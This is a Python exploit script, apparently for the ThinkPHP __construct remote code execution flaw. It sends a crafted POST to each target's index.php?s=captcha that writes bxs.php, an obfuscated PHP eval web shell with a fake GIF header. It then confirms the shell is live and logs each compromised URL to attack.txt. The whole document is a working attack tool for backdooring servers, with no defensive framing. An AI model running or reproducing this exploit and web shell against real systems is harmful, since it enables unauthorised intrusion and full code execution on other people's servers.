import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def check(url):
    print(f"[info] {url}-construct_code_exec3漏洞")
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Cookie": "PHPSESSID=zkj4alqbyfkez2i3l9erwqlkq",
        "Content-type":"application/x-www-form-urlencoded",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    try:
        requests.post(url=f"{url}/index.php?s=captcha",timeout=5,headers=headers,data=r"s=file_put_contents('bxs.php',base64_decode('R2lmODlhPD9waHAgY2xhc3MgR1lVSjlnN2wgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEg3elgzKXsgQGV2YWwoIi8qWjdDYzR1cldWOSovIi4kSDd6WDMuIi8qWjdDYzR1cldWOSovIik7IH19bmV3IEdZVUo5ZzdsKCRfUkVRVUVTVFsnNGs0ZDY2NiddKTs%2FPg%3D%3D'))&_method=__construct&method=POST&filter[]=assert",verify=False)
        res = requests.post(url=f"{url}/bxs.php",headers=headers,verify=False,timeout=5)
        if "Gif89a" in res.text :
            print(f"---->[construct_code_exec3] 上传成功，请检查：{url}/bxs.php")
            with open("attack.txt",'a') as attack:
                attack.write(f"shell:{url}/bxs.php,,construct_code_exec3\n")
            
    except:
        print(f"[error] {url}-construct_code_exec3漏洞")
    pass